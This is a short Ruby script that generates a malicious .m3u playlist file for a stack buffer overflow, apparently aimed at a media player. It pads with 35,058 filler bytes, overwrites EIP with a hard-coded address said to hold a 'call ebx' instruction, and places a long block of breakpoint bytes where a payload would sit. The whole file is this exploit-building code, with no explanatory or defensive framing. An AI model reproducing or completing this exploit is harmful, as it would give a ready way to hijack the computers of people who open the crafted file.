#!/usr/bin/env ruby

file = "findebx.m3u"

junk = "\x41" * 35058
eip = "\x28\x72\xAB\x01" # Memory Adress 01AB7228   #OP code for call ebx FFD3
nops = "\xcc" * 19749 #Start ESP - Start EBX + 1
junk2 = "\x43" * (60000 - (junk + eip + nops).size)

exploit = junk + eip + nops + junk2

File.open(file, 'w') {|f| f.write(exploit)}
puts "File #{file} was created"